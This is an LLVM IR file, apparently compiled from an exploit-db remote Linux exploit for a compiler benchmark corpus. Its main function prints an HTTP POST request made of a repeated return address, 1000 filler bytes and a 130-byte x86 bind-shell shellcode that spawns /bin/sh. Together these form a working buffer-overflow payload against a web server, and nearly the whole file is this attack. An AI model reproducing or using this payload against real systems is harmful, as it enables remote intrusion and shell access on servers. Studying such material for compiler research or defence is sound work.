; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22016.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22016.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.b1ndsh = private unnamed_addr constant [130 x i8] c"\89\E51\D2\B2f\89\D01\C9\89\CBC\89]\F8C\89]\F4K\89M\FC\8DM\F4\CD\801\C9\89E\F4Cf\89]\ECf\C7E\EE\0F'\89M\F0\8DE\EC\89E\F8\C6E\FC\10\89\D0\8DM\F4\CD\80\89\D0CC\CD\80\89\D0C\CD\80\89\C31\C9\B2?\89\D0\CD\80\89\D0A\CD\80\EB\18^\89u\081\C0\88F\07\89E\0C\B0\0B\89\F3\8DM\08\8DU\0C\CD\80\E8\E3\FF\FF\FF/bin/sh\00", align 16
@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [6 x i8] c"POST \00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"\82\E4\04\08\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.3 = private unnamed_addr constant [2 x i8] c"S\00", align 1
@.str.4 = private unnamed_addr constant [20 x i8] c"%s\0D\0Ax0x\0D\0Ax82\0D\0Al0l\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [130 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = bitcast [130 x i8]* %3 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %4, i8* align 16 getelementptr inbounds ([130 x i8], [130 x i8]* @__const.main.b1ndsh, i32 0, i32 0), i64 130, i1 false)
  %5 = load i32, i32* @stdout, align 4
  %6 = call i32 (i32, i8*, ...) @fprintf(i32 %5, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  store i32 0, i32* %2, align 4
  br label %7

7:                                                ; preds = %13, %0
  %8 = load i32, i32* %2, align 4
  %9 = icmp slt i32 %8, 1032
  br i1 %9, label %10, label %16

10:                                               ; preds = %7
  %11 = load i32, i32* @stdout, align 4
  %12 = call i32 (i32, i8*, ...) @fprintf(i32 %11, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  br label %13

13:                                               ; preds = %10
  %14 = load i32, i32* %2, align 4
  %15 = add nsw i32 %14, 4
  store i32 %15, i32* %2, align 4
  br label %7

16:                                               ; preds = %7
  %17 = load i32, i32* @stdout, align 4
  %18 = call i32 (i32, i8*, ...) @fprintf(i32 %17, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %2, align 4
  br label %19

19:                                               ; preds = %25, %16
  %20 = load i32, i32* %2, align 4
  %21 = icmp slt i32 %20, 1000
  br i1 %21, label %22, label %28

22:                                               ; preds = %19
  %23 = load i32, i32* @stdout, align 4
  %24 = call i32 (i32, i8*, ...) @fprintf(i32 %23, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0))
  br label %25

25:                                               ; preds = %22
  %26 = load i32, i32* %2, align 4
  %27 = add nsw i32 %26, 1
  store i32 %27, i32* %2, align 4
  br label %19

28:                                               ; preds = %19
  %29 = load i32, i32* @stdout, align 4
  %30 = getelementptr inbounds [130 x i8], [130 x i8]* %3, i64 0, i64 0
  %31 = call i32 (i32, i8*, ...) @fprintf(i32 %29, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.4, i64 0, i64 0), i8* %30)
  %32 = load i32, i32* %1, align 4
  ret i32 %32
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
